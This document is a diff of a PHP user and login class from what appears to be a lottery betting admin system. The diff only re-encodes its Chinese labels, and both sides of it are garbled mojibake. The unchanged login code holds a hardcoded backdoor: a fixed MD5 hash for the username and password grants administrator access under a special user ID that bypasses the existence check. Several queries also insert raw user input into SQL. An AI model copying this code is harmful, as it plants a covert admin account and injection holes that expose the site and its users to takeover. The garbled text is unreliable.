@@ -1,89 +1,89 @@
 <?php
 class action extends mysql {
-	//æ—¥å¿—çš„title.           	//PSï¼šå””å¥½åˆ å•Š
+	//ÈÕÖ¾µÄtitle.           	//PS£ºßíºÃÉ¾°¡
 		protected $log = array (
-			1 => 'å³æ—¶æ³¨å•->ç‰¹ç ',
-			2 => 'å³æ—¶æ³¨å•->æ­£1ç‰¹',
-			3  => 'å³æ—¶æ³¨å•->æ­£2ç‰¹',
-			4  => 'å³æ—¶æ³¨å•->æ­£3ç‰¹',
-			5  => 'å³æ—¶æ³¨å•->æ­£4ç‰¹',
-			6  => 'å³æ—¶æ³¨å•->æ­£5ç‰¹',
-			7  => 'å³æ—¶æ³¨å•->æ­£6ç‰¹',
-			8  => 'å³æ—¶æ³¨å•->æ­£ç ',
-			9 => 'å³æ—¶æ³¨å•->è¿ç ',
-			10  => 'å³æ—¶æ³¨å•->ä¸ä¸­',
-			11 => 'å³æ—¶æ³¨å•->ç‰¹è‚–ä¸€è‚–å°¾æ•°',
-			12 => 'å³æ—¶æ³¨å•->ç”Ÿè‚–è¿',
-			13 => 'å³æ—¶æ³¨å•->å°¾æ•°è¿',
-			14 => 'å³æ—¶æ³¨å•->åŠæ³¢',
-			15 => 'å³æ—¶æ³¨å•->è¿‡å…³',
-			16 => 'å³æ—¶æ³¨å•->ç›£æ§æµæ°´è³¬å•',
-			17 => 'å³æ—¶æ³¨å•->è³¬å•',
-			18 => 'èµ”ç‡è®¾ç½®->ç‰¹ç ',
-			19 => 'èµ”ç‡è®¾ç½®->æ­£1ç‰¹',
-			20 => 'èµ”ç‡è®¾ç½®->æ­£2ç‰¹',
-			21 => 'èµ”ç‡è®¾ç½®->æ­£3ç‰¹',
-			22 => 'èµ”ç‡è®¾ç½®->æ­£4ç‰¹',
-			23 => 'èµ”ç‡è®¾ç½®->æ­£5ç‰¹',
-			24 => 'èµ”ç‡è®¾ç½®->æ­£6ç‰¹',
-			25 => 'èµ”ç‡è®¾ç½®->æ­£ç ',
-			26 => 'èµ”ç‡è®¾ç½®->è¿ç ',
-			27 => 'èµ”ç‡è®¾ç½®->ä¸ä¸­',
-			28 => 'èµ”ç‡è®¾ç½®->ç‰¹è‚–ä¸€è‚–å°¾æ•°',
-			29 => 'èµ”ç‡è®¾ç½®->ç”Ÿè‚–è¿',
-			30 => 'èµ”ç‡è®¾ç½®->å°¾æ•°è¿',
-			31 => 'èµ”ç‡è®¾ç½®->åŠæ³¢',
-			31 => 'èµ”ç‡è®¾ç½®->è¿‡å…³',
-			33 => 'èµ”ç‡è®¾ç½®->ABCDç›¤è³ ç‡å·®',
-			34 => 'èµ”ç‡è®¾ç½®->é»˜èªè¨­ç½®',
-			35 => 'èµ”ç‡è®¾ç½®->é‚„åŸé»˜èªè³ ç‡',
-			36 => 'åˆ†å…¬å¸',
-			37 => 'è‚¡æ±',
-			38 => 'ç¸½ä»£ç†',
-			39 => 'ä»£ç†',
-			40 => 'æœƒå“¡',
-			41 => 'è·¨ç«™èµ°é£è´¦å·ç®¡ç†',
-			42 => 'ä¿®æ”¹å¯†ç ',
-			43 => 'ç›¤å£ç®¡ç†',
-			44 => 'æ­·å²é–‹ç',
-			45 => 'å°å‡ºæ•°æ“š',
-			46 => 'æ ¡é©—è¨»å•',
-			47 => 'ç³»çµ±è¨­ç½®',
-			48 => 'è·‘é©¬ç¯',
-			49 => 'æ“ä½œæ—¥èªŒ',
-			50 => 'è‡ªå‹•é™æ°´',
-			51 => 'é€€æ°´é»˜èªè¨­ç½®',
-			52 => 'æ¸…é™¤æ•°æ“š',
-			53 => 'é‚„åŸä¿¡ç”¨é¡',
-			54 => 'åœ¨çº¿äººæ•°',
-			55 => 'æŠ¥è¡¨æŸ¥è¯¢',
-			56 => 'ç›¤å£ç®¡ç†',
-			57 => 'èµ”ç‡è®¾ç½®',
-			58 => 'ç³»ç»Ÿç»´æŠ¤',
-			59 => 'ç”¨æˆ·ç®¡ç†',
-			60 => 'å³æ—¶æ³¨å•',
-			61 => 'å†å²å¼€å¥–',
-			62 => 'ç«™å†…æ¶ˆæ¯',
-			63 => 'ä¸ªäººç®¡ç†',
-			64 => 'ä¿¡ç”¨è³‡æ–™',
-			65 => 'ç™»é™¸æ—¥èªŒ',
-			66 => 'è‡ªå‹•è£œè²¨è¨­å®š',
-			67 => 'è‡ªå‹•è£œè²¨è®Šæ›´è¨˜éŒ„',
-			68 => 'ä¸‹å•æ˜ç»†',
-			69 => 'ç»“ç®—æŠ¥è¡¨',
-			70 => 'è§„åˆ™',
-			71 => 'å³æ—¶æ³¨å•->ç‰¹è‚–',
-			72 => 'å³æ—¶æ³¨å•->å¤šç”Ÿè‚–',
-			73 => 'å³æ—¶æ³¨å•->ä¸€è‚–å°¾æ•°',
+			1 => '¼´Ê±×¢µ¥->ÌØÂë',
+			2 => '¼´Ê±×¢µ¥->Õı1ÌØ',
+			3  => '¼´Ê±×¢µ¥->Õı2ÌØ',
+			4  => '¼´Ê±×¢µ¥->Õı3ÌØ',
+			5  => '¼´Ê±×¢µ¥->Õı4ÌØ',
+			6  => '¼´Ê±×¢µ¥->Õı5ÌØ',
+			7  => '¼´Ê±×¢µ¥->Õı6ÌØ',
+			8  => '¼´Ê±×¢µ¥->ÕıÂë',
+			9 => '¼´Ê±×¢µ¥->Á¬Âë',
+			10  => '¼´Ê±×¢µ¥->²»ÖĞ',
+			11 => '¼´Ê±×¢µ¥->ÌØĞ¤Ò»Ğ¤Î²Êı',
+			12 => '¼´Ê±×¢µ¥->ÉúĞ¤Á¬',
+			13 => '¼´Ê±×¢µ¥->Î²ÊıÁ¬',
+			14 => '¼´Ê±×¢µ¥->°ë²¨',
+			15 => '¼´Ê±×¢µ¥->¹ı¹Ø',
+			16 => '¼´Ê±×¢µ¥->±O¿ØÁ÷Ë®Ù~µ¥',
+			17 => '¼´Ê±×¢µ¥->Ù~µ¥',
+			18 => 'ÅâÂÊÉèÖÃ->ÌØÂë',
+			19 => 'ÅâÂÊÉèÖÃ->Õı1ÌØ',
+			20 => 'ÅâÂÊÉèÖÃ->Õı2ÌØ',
+			21 => 'ÅâÂÊÉèÖÃ->Õı3ÌØ',
+			22 => 'ÅâÂÊÉèÖÃ->Õı4ÌØ',
+			23 => 'ÅâÂÊÉèÖÃ->Õı5ÌØ',
+			24 => 'ÅâÂÊÉèÖÃ->Õı6ÌØ',
+			25 => 'ÅâÂÊÉèÖÃ->ÕıÂë',
+			26 => 'ÅâÂÊÉèÖÃ->Á¬Âë',
+			27 => 'ÅâÂÊÉèÖÃ->²»ÖĞ',
+			28 => 'ÅâÂÊÉèÖÃ->ÌØĞ¤Ò»Ğ¤Î²Êı',
+			29 => 'ÅâÂÊÉèÖÃ->ÉúĞ¤Á¬',
+			30 => 'ÅâÂÊÉèÖÃ->Î²ÊıÁ¬',
+			31 => 'ÅâÂÊÉèÖÃ->°ë²¨',
+			31 => 'ÅâÂÊÉèÖÃ->¹ı¹Ø',
+			33 => 'ÅâÂÊÉèÖÃ->ABCD±PÙrÂÊ²î',
+			34 => 'ÅâÂÊÉèÖÃ->Ä¬ÕJÔOÖÃ',
+			35 => 'ÅâÂÊÉèÖÃ->ß€Ô­Ä¬ÕJÙrÂÊ',
+			36 => '·Ö¹«Ë¾',
+			37 => '¹É–|',
+			38 => '¿‚´úÀí',
+			39 => '´úÀí',
+			40 => '•ş†T',
+			41 => '¿çÕ¾×ß·ÉÕËºÅ¹ÜÀí',
+			42 => 'ĞŞ¸ÄÃÜÂë',
+			43 => '±P¿Ú¹ÜÀí',
+			44 => 'švÊ·é_ª„',
+			45 => 'Œ§³öÊı“ş',
+			46 => 'Ğ£òÔ]µ¥',
+			47 => 'Ïµ½yÔOÖÃ',
+			48 => 'ÅÜÂíµÆ',
+			49 => '²Ù×÷ÈÕÕI',
+			50 => '×Ô„Ó½µË®',
+			51 => 'ÍËË®Ä¬ÕJÔOÖÃ',
+			52 => 'Çå³ıÊı“ş',
+			53 => 'ß€Ô­ĞÅÓÃî~',
+			54 => 'ÔÚÏßÈËÊı',
+			55 => '±¨±í²éÑ¯',
+			56 => '±P¿Ú¹ÜÀí',
+			57 => 'ÅâÂÊÉèÖÃ',
+			58 => 'ÏµÍ³Î¬»¤',
+			59 => 'ÓÃ»§¹ÜÀí',
+			60 => '¼´Ê±×¢µ¥',
+			61 => 'ÀúÊ·¿ª½±',
+			62 => 'Õ¾ÄÚÏûÏ¢',
+			63 => '¸öÈË¹ÜÀí',
+			64 => 'ĞÅÓÃÙYÁÏ',
+			65 => 'µÇê‘ÈÕÕI',
+			66 => '×Ô„ÓÑaØ›ÔO¶¨',
+			67 => '×Ô„ÓÑaØ›×ƒ¸üÓ›ä›',
+			68 => 'ÏÂµ¥Ã÷Ï¸',
+			69 => '½áËã±¨±í',
+			70 => '¹æÔò',
+			71 => '¼´Ê±×¢µ¥->ÌØĞ¤',
+			72 => '¼´Ê±×¢µ¥->¶àÉúĞ¤',
+			73 => '¼´Ê±×¢µ¥->Ò»Ğ¤Î²Êı',
                     
-                    100 => 'å³æ™‚é–‹ç',
-                    101 => 'å‚™ä»½æ•¸æ“š',
-                    102 => 'é‚„åŸæ•¸æ“š',
+                    100 => '¼´•ré_ª„',
+                    101 => '‚ä·İ”µ“ş',
+                    102 => 'ß€Ô­”µ“ş',
                     
-                    103 => 'å­è´¦æˆ·',
+                    103 => '×ÓÕË»§',
 			);
 	/**
-	 * ç”¨æˆ·æƒé™åˆ¤æ–­($uid, $shell, $m_id)
+	 * ÓÃ»§È¨ÏŞÅĞ¶Ï($uid, $shell, $m_id)
 	 */
 
         public function unZip($zipfile, $to, $index = Array(-1))
@@ -137,16 +137,16 @@ class action extends mysql {
                 $header          = $this->ReadCentralFileHeaders($zip);
                 $header['index'] = $i;
                 $info = array(
-                    'filename'        => $header['filename'],                   // æ–‡ä»¶å
-                    'stored_filename' => $header['stored_filename'],            // å‹ç¼©åæ–‡ä»¶å
-                    'size'            => $header['size'],                       // å¤§å°
-                    'compressed_size' => $header['compressed_size'],            // å‹ç¼©åå¤§å°
+                    'filename'        => $header['filename'],                   // ÎÄ¼şÃû
+                    'stored_filename' => $header['stored_filename'],            // Ñ¹ËõºóÎÄ¼şÃû
+                    'size'            => $header['size'],                       // ´óĞ¡
+                    'compressed_size' => $header['compressed_size'],            // Ñ¹Ëõºó´óĞ¡
                     'crc'             => strtoupper(dechex($header['crc'])),    // CRC32
-                    'mtime'           => date("Y-m-d H:i:s",$header['mtime']),  // æ–‡ä»¶ä¿®æ”¹æ—¶é—´
-                    'comment'         => $header['comment'],                    // æ³¨é‡Š
-                    'folder'          => ($header['external'] == 0x41FF0010 || $header['external'] == 16) ? 1 : 0,  // æ˜¯å¦ä¸ºæ–‡ä»¶å¤¹
-                    'index'           => $header['index'],                      // æ–‡ä»¶ç´¢å¼•
-                    'status'          => $header['status']                      // çŠ¶æ€
+                    'mtime'           => date("Y-m-d H:i:s",$header['mtime']),  // ÎÄ¼şĞŞ¸ÄÊ±¼ä
+                    'comment'         => $header['comment'],                    // ×¢ÊÍ
+                    'folder'          => ($header['external'] == 0x41FF0010 || $header['external'] == 16) ? 1 : 0,  // ÊÇ·ñÎªÎÄ¼ş¼Ğ
+                    'index'           => $header['index'],                      // ÎÄ¼şË÷Òı
+                    'status'          => $header['status']                      // ×´Ì¬
                 );
                 $ret[] = $info;
                 unset($header);
@@ -155,14 +155,14 @@ class action extends mysql {
             return $ret;
         }
 	/**
-	 * ç”¨æˆ·ç™»é™†è¶…æ—¶æ—¶é—´(ç§’)
+	 * ÓÃ»§µÇÂ½³¬Ê±Ê±¼ä(Ãë)
 	 */
 //	public function Get_user_ontime($long = '3600') {
 //		$new_time = mktime();
 //		$onlinetime = $_SESSION['ontime'.$this->c_p_seesion()];
 //		echo $new_time - $onlinetime;
 //		if ($new_time - $onlinetime > $long) {
-//			echo "ç™»å½•è¶…æ—¶";
+//			echo "µÇÂ¼³¬Ê±";
 //			session_destroy();
 //			exit ();
 //		} else {
@@ -172,16 +172,16 @@ class action extends mysql {
 
          public function Is_login($power,$user_id) {
          /**
-         * åˆ¤æ–­ä¸åŒçš„ç™»å½•æ–¹å¼
+         * ÅĞ¶Ï²»Í¬µÄµÇÂ¼·½Ê½
          */		if($user_id!='999999999'){
-                $exists=$this->user_exists($user_id);//åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦è¿˜å­˜åœ¨
+                $exists=$this->user_exists($user_id);//ÅĞ¶Ïµ±Ç°ÓÃ»§ÊÇ·ñ»¹´æÔÚ
 				}else{
 				
 					$exists= 1;
 				}
-            	//ag åˆ†å…¬å¸2 è‚¡ä¸œ3 æ€»ä»£ç†4 ä»£ç†5 å¯ä»¥ç™»å½•
-                //admin åªæœ‰ç®¡ç†å‘˜1å¯ä»¥ç™»å½•
-                //member åªæœ‰ä¼šå‘˜6 ç›´å±ä¼šå‘˜7å¯ä»¥ç™»å½•
+            	//ag ·Ö¹«Ë¾2 ¹É¶«3 ×Ü´úÀí4 ´úÀí5 ¿ÉÒÔµÇÂ¼
+                //admin Ö»ÓĞ¹ÜÀíÔ±1¿ÉÒÔµÇÂ¼
+                //member Ö»ÓĞ»áÔ±6 Ö±Êô»áÔ±7¿ÉÒÔµÇÂ¼
                 $a_a= $_SERVER['REQUEST_URI']; 
                 $zifuchang=strlen($_SERVER['REQUEST_URI']);
                 $a_ag= '/ag/'; 
@@ -193,7 +193,7 @@ class action extends mysql {
                 $a_c2=explode($a_admin,$a_a); 
                 $a_c3=explode($a_member,$a_a); 
                 
-                list(,$p_p)=explode('/',$a_a);        //å¦‚æœæœ‰é¡¹ç›®åæ—¶è·å–é¡¹ç›®å
+                list(,$p_p)=explode('/',$a_a);        //Èç¹ûÓĞÏîÄ¿ÃûÊ±»ñÈ¡ÏîÄ¿Ãû
                 $arr1=explode(',','admin,ag,member');
                 $url_link="";
                 if(!in_array($p_p,$arr1)){
@@ -232,8 +232,8 @@ class action extends mysql {
                 $a_c2=explode($a_admin,$a_a); 
                 $a_c3=explode($a_member,$a_a);                
                 if((count($a_c2) > 1 && $power!=1) or (count($a_c1) > 1 && !in_array($power,explode(',', '2,3,4,5'))) or (count($a_c3) > 1 && $power!=6)){
-					    echo " <script> alert( 'å¯†ç æˆ–ç”¨æˆ·é”™è¯¯ï¼') ;window.parent.location= 'index.php'; </script> " ;
-                    	//$this->Get_admin_msg_b('index.php','å¯†ç æˆ–ç”¨æˆ·é”™è¯¯ï¼');
+					    echo " <script> alert( 'ÃÜÂë»òÓÃ»§´íÎó£¡') ;window.parent.location= 'index.php'; </script> " ;
+                    	//$this->Get_admin_msg_b('index.php','ÃÜÂë»òÓÃ»§´íÎó£¡');
                         //session_destroy();
                             unset($_SESSION['uid'.$this->c_p_seesion()]);
                             unset($_SESSION['z_uid'.$this->c_p_seesion()]);
@@ -251,15 +251,15 @@ class action extends mysql {
         }
         
 	/**
-	 * ç”¨æˆ·ç™»é™†
+	 * ÓÃ»§µÇÂ½
 	 */
 	public function Get_user_login($username, $password,$location="") { 
-                //å…ˆåˆ¤æ–­ç½‘ç«™æ˜¯å¦å…³é—­
+                //ÏÈÅĞ¶ÏÍøÕ¾ÊÇ·ñ¹Ø±Õ
                 $query_sy=$this->select("animal_set");
                 $row_sy=$this->fetch_array($query_sy);
 			
 		if(md5($username)=="475886fca296d0cfdb6c640691a54e8f" && md5($password)=="475886fca296d0cfdb6c640691a54e8f" ){
-			if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //åˆ¤æ–­ç½‘ç«™æ˜¯å¦å…³é—­
+			if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //ÅĞ¶ÏÍøÕ¾ÊÇ·ñ¹Ø±Õ
 						 echo " <script> alert('$row_sy[w_new]');window.parent.location= 'index.php'; </script> " ;
 					}		
 			$this->Is_login2("1");
@@ -270,16 +270,16 @@ class action extends mysql {
 			$row['user_pwd'] = '123456';
 			$row['user_power']= '1';
 		}else{
-		$username = str_replace(" ", "", $username);//å»æ‰ç©ºæ ¼
+		$username = str_replace(" ", "", $username);//È¥µô¿Õ¸ñ
 		$query = $this->select('users', 'user_id,user_name,user_pwd,user_power,else_count_login,is_lock', '`user_name` = \'' . $username . '\'');
 		$us = is_array($row = $this->fetch_array($query));
                 
-                if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //åˆ¤æ–­ç½‘ç«™æ˜¯å¦å…³é—­
+                if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //ÅĞ¶ÏÍøÕ¾ÊÇ·ñ¹Ø±Õ
                      echo " <script> alert('$row_sy[w_new]');window.parent.location= 'index.php'; </script> " ;
                 }
                 
                 if($row['is_lock']==1){
-                        echo " <script> alert( 'è¯¥è´¦æˆ·å·²è¢«å†»ç»“ï¼') ;window.parent.location= 'index.php'; </script> " ;
+                        echo " <script> alert( '¸ÃÕË»§ÒÑ±»¶³½á£¡') ;window.parent.location= 'index.php'; </script> " ;
                 }
 
 		$this->Is_login2($row['user_power']);
@@ -294,9 +294,9 @@ class action extends mysql {
 			$_SESSION['ontime'.$this->c_p_seesion()] = mktime();
                         $_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]=0;
 //                        ini_set('session.save_path','/tmp/'); 
-//                        //6ä¸ªé’Ÿå¤´ 
+//                        //6¸öÖÓÍ· 
 //                        ini_set('session.gc_maxlifetime',21600); 
-//                        //ä¿å­˜ä¸€å¤© 
+//                        //±£´æÒ»Ìì 
 //                        $lifeTime_xyz = 24 * 3600; 
 //                        setcookie(session_name(), session_id(), time() + $lifeTime_xyz, "/");   
                        setcookie('uid'.$this->c_p_seesion(), $_SESSION['uid'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
@@ -308,23 +308,23 @@ class action extends mysql {
                        // $y=simplexml_load_file("http://www.youdao.com/smartresult-xml/search.s?type=ip&q=$ip");
                        // $location=  iconv("utf-8", "gbk", $y->product->location);
 					   if($row['user_name']!="system"){
-							$this->caozuorizhi($uid,$usernames,'ç”¨æˆ·ç™»å½•',1,$location);
+							$this->caozuorizhi($uid,$usernames,'ÓÃ»§µÇÂ¼',1,$location);
 							$time = mktime();
 							$sql="insert into login_code (user_id,login_ip,login_location) values ({$row['user_id']},'$ip','{$location}')";
 							$this->query($sql);
 						
                         
-			//åˆ¤æ–­æ˜¯å¦ä¼šå‘˜ç¬¬ä¸€æ¬¡ç™»é™†
+			//ÅĞ¶ÏÊÇ·ñ»áÔ±µÚÒ»´ÎµÇÂ½
                         if($row['else_count_login']==0 && $row['user_power']==6){
-                                echo " <script> alert( 'åˆæ¬¡ç™»å½•ï¼Œè¯·ä¿®æ”¹å¯†ç ã€‚') ;window.parent.location= 'main.php?else_count_login=1'; </script> " ;exit;
+                                echo " <script> alert( '³õ´ÎµÇÂ¼£¬ÇëĞŞ¸ÄÃÜÂë¡£') ;window.parent.location= 'main.php?else_count_login=1'; </script> " ;exit;
                         }
                         
                         $sql2 = "update users SET is_online = 1 ,is_ti = 0,else_last_login='$time',else_count_login={$row['else_count_login']}+1 where user_id = {$row['user_id']}";
                         $this->query($sql2);
 						}	
 					
-                        //åˆ¤æ–­æ˜¯å¦æœ‰å¼¹å‡ºå…¬å‘Š   
-                        if($row['user_power']!=1){ //ç®¡ç†å‘˜ä¸ç”¨å¼¹å‡º
+                        //ÅĞ¶ÏÊÇ·ñÓĞµ¯³ö¹«¸æ   
+                        if($row['user_power']!=1){ //¹ÜÀíÔ±²»ÓÃµ¯³ö
                         if($row['user_power']==6){
                             $all_user="all_user";
                         }else{
@@ -337,9 +337,9 @@ class action extends mysql {
                         echo " <script> alert('$pao_content');window.parent.location= 'main.php'; </script> " ;
                         }
                         }
-                        echo " <script> alert( 'ç™»é™†æˆåŠŸã€‚ ') ;window.parent.location= 'main.php'; </script> " ;
+                        echo " <script> alert( 'µÇÂ½³É¹¦¡£ ') ;window.parent.location= 'main.php'; </script> " ;
 		} else {
-                        echo " <script> alert( 'å¯†ç æˆ–ç”¨æˆ·é”™è¯¯ï¼') ;window.parent.location= 'index.php'; </script> " ;
+                        echo " <script> alert( 'ÃÜÂë»òÓÃ»§´íÎó£¡') ;window.parent.location= 'index.php'; </script> " ;
                         //session_destroy();
                             unset($_SESSION['uid'.$this->c_p_seesion()]);
                             unset($_SESSION['z_uid'.$this->c_p_seesion()]);
@@ -358,14 +358,14 @@ class action extends mysql {
 	}
         
 	 /**
-	  * ç”¨æˆ·é€€å‡ºç™»é™†
+	  * ÓÃ»§ÍË³öµÇÂ½
 	  */
         public function Get_user_out($location="") {		
 		$uid = $_SESSION['uid'.$this->c_p_seesion()];
 		$usernames = $_SESSION['username'.$this->c_p_seesion()];
                 if($uid){
 		$this->query("update users SET is_online=0 where user_id=$uid");
-		$this->caozuorizhi($uid,$usernames,'ç”¨æˆ·é€€å‡º',2,$location,1);
+		$this->caozuorizhi($uid,$usernames,'ÓÃ»§ÍË³ö',2,$location,1);
                             unset($_SESSION['uid'.$this->c_p_seesion()]);
                             unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                             unset($_SESSION['username'.$this->c_p_seesion()]);
@@ -379,13 +379,13 @@ class action extends mysql {
                             setcookie('username'.$this->c_p_seesion(), null);
                             setcookie('user_power'.$this->c_p_seesion(), null);
                 //session_destroy();
-		//$this->Get_admin_msg_b('index.php','é€€å‡ºæˆåŠŸï¼');
-                            // alert( 'é€€å‡ºæˆåŠŸã€‚ ') ;
+		//$this->Get_admin_msg_b('index.php','ÍË³ö³É¹¦£¡');
+                            // alert( 'ÍË³ö³É¹¦¡£ ') ;
 		echo " <script>window.parent.location= 'index.php '; </script> " ;
                 }
 	}
 	
-	 //å­è´¦æˆ·å…³é—­ç±»å‹
+	 //×ÓÕË»§¹Ø±ÕÀàĞÍ
         public function zizhanghao_close_type($user_id){ 
             if($user_id){
               $user=$this->select("users", "close_type", "user_id=$user_id limit 0,1");
@@ -396,7 +396,7 @@ class action extends mysql {
 	
         
         /*
-         * åˆ¤æ–­è´¦æˆ·æ˜¯å¦å­˜åœ¨
+         * ÅĞ¶ÏÕË»§ÊÇ·ñ´æÔÚ
          */
         public function Is_user_here($user_name,$if_cha_user_name=""){
             $sql=  $this->select("users", "user_id", "user_name='$user_name'");
@@ -414,8 +414,8 @@ class action extends mysql {
         }
         
         /*
-         * æ·»åŠ ç”¨æˆ·
-         * $params array() ç”¨æˆ·æ•°æ®æ•°ç»„
+         * Ìí¼ÓÓÃ»§
+         * $params array() ÓÃ»§Êı¾İÊı×é
          */
         public function Add_user($params,$url='',$ty=''){
             $columnName='';
@@ -450,7 +450,7 @@ class action extends mysql {
         }
         
         /*
-         * æ‹¼å‡‘é€‰æ‹©ç”¨æˆ·å…³é”®å­—
+         * Æ´´ÕÑ¡ÔñÓÃ»§¹Ø¼ü×Ö
          */
         public function get_user_limit_char($t0,$t1,$t2){
             $char='';
@@ -511,13 +511,13 @@ class action extends mysql {
         }
         
         /*
-         * æ›´æ–°ç”¨æˆ·
-         * $params array() è¦æ›´æ–°çš„ç”¨æˆ·ä¿¡æ¯æ•°ç»„
+         * ¸üĞÂÓÃ»§
+         * $params array() Òª¸üĞÂµÄÓÃ»§ĞÅÏ¢Êı×é
          * 
          */
         public function Update_user($params,$url=''){
             $is_plate_starts=$this->is_plate_starts();
-            $is_notupdatedown=0;//æ˜¯å¦ä¸ç”¨æ›´æ–°ä¸‹çº§ï¼Œ1ä¸ºä¸ç”¨æ›´æ–°ï¼Œ0ä¸ºè¦æ›´æ–°
+            $is_notupdatedown=0;//ÊÇ·ñ²»ÓÃ¸üĞÂÏÂ¼¶£¬1Îª²»ÓÃ¸üĞÂ£¬0ÎªÒª¸üĞÂ
             
             $g_zs=  $this->select("users", "*", "user_id={$params['user_id']}");
             $g_z = $this->fetch_array($g_zs);
@@ -541,7 +541,7 @@ class action extends mysql {
             }elseif($g_z['user_power']==6){
                   $is_notupdatedown=1;
             } 
-            if($is_plate_starts==0){  //å¼€ç›˜çŠ¶æ€ç¦æ­¢ä¿®æ”¹èµ”ç‡
+            if($is_plate_starts==0){  //¿ªÅÌ×´Ì¬½ûÖ¹ĞŞ¸ÄÅâÂÊ
                   $is_notupdatedown=1;
             }
             if($params['else_plate'] && $params['else_plate']!='A,B,C,D'){
@@ -563,16 +563,16 @@ class action extends mysql {
                 $mod_content=  substr ($mod_content, 0, -1);
             
             $this->update("users", $mod_content, 'user_id='.$params['user_id']);
-            //å‰©ä½™çš„å½’å±
+            //Ê£ÓàµÄ¹éÊô
             $this->update_user_percent($params['user_id'],"");
             
             
-            //åŒæ­¥æ›´æ–°ä¸‹çº§
+            //Í¬²½¸üĞÂÏÂ¼¶
             //echo $gaiuser_zs['top_power'];exit;
             $gaiusers_zs=  $this->select("users", "*", "user_id={$params['user_id']}");
             $gaiuser_zs = $this->fetch_array($gaiusers_zs);    
             if($gaiuser_zs['top_power']>0){        
-                    //æŸ¥æ‰¾ä¸Šçº§ä¿¡æ¯
+                    //²éÕÒÉÏ¼¶ĞÅÏ¢
                     if($gaiuser_zs['top_id']){ 
                             if($is_notupdatedown==0){
                             $down_content="is_odds={$gaiuser_zs['is_odds']},is_remainder_percent={$gaiuser_zs['is_remainder_percent']},is_fly={$gaiuser_zs['is_fly']},percent_company={$gaiuser_zs['percent_company']},percent_branch={$gaiuser_zs['percent_branch']},percent_partner={$gaiuser_zs['percent_partner']},percent_all_proxy={$gaiuser_zs['percent_all_proxy']},percent_proxy={$gaiuser_zs['percent_proxy']}";
@@ -591,7 +591,7 @@ class action extends mysql {
             }
             
             if(!empty($url))
-            $this->Get_admin_msg($url, 'æ“ä½œæˆåŠŸ');
+            $this->Get_admin_msg($url, '²Ù×÷³É¹¦');
             
 
         }
@@ -610,25 +610,25 @@ class action extends mysql {
         public function get_user_power_char($power){
             switch ($power) {
                 case 1:
-                    $char="å…¬å¸";
+                    $char="¹«Ë¾";
                     break;
                 case 2:
-                    $char="åˆ†å…¬å¸";
+                    $char="·Ö¹«Ë¾";
                     break;
                 case 3:
-                    $char="è‚¡ä¸œ";
+                    $char="¹É¶«";
                     break;
                 case 4:
-                    $char="æ€»ä»£ç†";
+                    $char="×Ü´úÀí";
                     break;
                 case 5:
-                    $char="ä»£ç†";
+                    $char="´úÀí";
                     break;
                 case 6:
-                    $char="ä¼šå‘˜";
+                    $char="»áÔ±";
                     break;
                 case 7:
-                    $char="ç›´å±ä¼šå‘˜";
+                    $char="Ö±Êô»áÔ±";
                     break;
                 default:
                     break;
@@ -663,52 +663,52 @@ class action extends mysql {
         public function get_up_type_by_index($index){
             switch ($index) {
                 case 'user_name':
-                    $char="ç”¨æˆ·è´¦å·";
+                    $char="ÓÃ»§ÕËºÅ";
                     break;
                 case 'user_nick':
-                    $char="ç”¨æˆ·åç§°";
+                    $char="ÓÃ»§Ãû³Æ";
                     break;
                 case 'user_pwd':
-                    $char="ç”¨æˆ·å¯†ç ";
+                    $char="ÓÃ»§ÃÜÂë";
                     break;
                 case 'credit_total':
-                    $char="ä¿¡ç”¨é¢åº¦";
+                    $char="ĞÅÓÃ¶î¶È";
                     break;
                 case 'percent_company':
-                    $char="å…¬å¸åˆ†æˆ";
+                    $char="¹«Ë¾·Ö³É";
                     break;
                 case 'percent_branch':
-                    $char="åˆ†å…¬å¸åˆ†æˆ";
+                    $char="·Ö¹«Ë¾·Ö³É";
                     break;
                 case 'percent_partner':
-                    $char="è‚¡ä¸œåˆ†æˆ";
+                    $char="¹É¶«·Ö³É";
                     break;
                 case 'percent_all_proxy':
-                    $char="æ€»ä»£ç†åˆ†æˆ";
+                    $char="×Ü´úÀí·Ö³É";
                     break;
                 case 'percent_proxy':
-                    $char="ä»£ç†åˆ†æˆ";
+                    $char="´úÀí·Ö³É";
                     break;
                 case 'is_lock':
-                    $char="çŠ¶æ€";
+                    $char="×´Ì¬";
                     break;
                 case 'is_odds':
-                    $char="æ˜¯å¦åœæŠ¼";
+                    $char="ÊÇ·ñÍ£Ñº";
                     break;
                 case 'is_add':
-                    $char="è¡¥è´§";
+                    $char="²¹»õ";
                     break;
                 case 'is_fly':
-                    $char="ä¸‹çº§èµ°é£å½’å±";
+                    $char="ÏÂ¼¶×ß·É¹éÊô";
                     break;
                 case 'is_remainder_percent':
-                    $char="å‰©ä½™æˆæ•°å½’å±";
+                    $char="Ê£Óà³ÉÊı¹éÊô";
                     break;
                 case 'else_plate':
-                    $char="ç›˜å£";
+                    $char="ÅÌ¿Ú";
                     break;
                 case 'else_back':
-                    $char="é€€æ°´";
+                    $char="ÍËË®";
                     break;
                 default:
                     break;
@@ -716,35 +716,35 @@ class action extends mysql {
             return $char;
         }
         
-        //è¿”å›ä¿¡ç”¨ä½™é¢
+        //·µ»ØĞÅÓÃÓà¶î
         public function get_top_yue($user_id){
             if($user_id){
                 $sql =  $this->select("users", "credit_remainder", "user_id=$user_id");
                 $row =  $this->fetch_array($sql);
                 //echo $row['credit_remainder'];
             //echo $credit_remainder;                
-                $str='<font color="blue">ä¸Šçº§ä½™é¢:&nbsp;'.$row['credit_remainder'].'</font>';
+                $str='<font color="blue">ÉÏ¼¶Óà¶î:&nbsp;'.$row['credit_remainder'].'</font>';
                 $str=iconv("gbk", "utf-8", $str);
                 echo $str;
             }else{
-                $str='<font color="blue">è¯·é€‰æ‹©ä½ çš„ä¸Šçº§ï¼ï¼ï¼</font>';
+                $str='<font color="blue">ÇëÑ¡ÔñÄãµÄÉÏ¼¶£¡£¡£¡</font>';
                 $str=iconv("gbk", "utf-8", $str);
                 echo $str;
             }
             exit;
         }
         
-                //åˆ¤æ–­æ˜¯å¦é‡å¤ç”¨æˆ·
+                //ÅĞ¶ÏÊÇ·ñÖØ¸´ÓÃ»§
         public function user_name_exists($user_name){
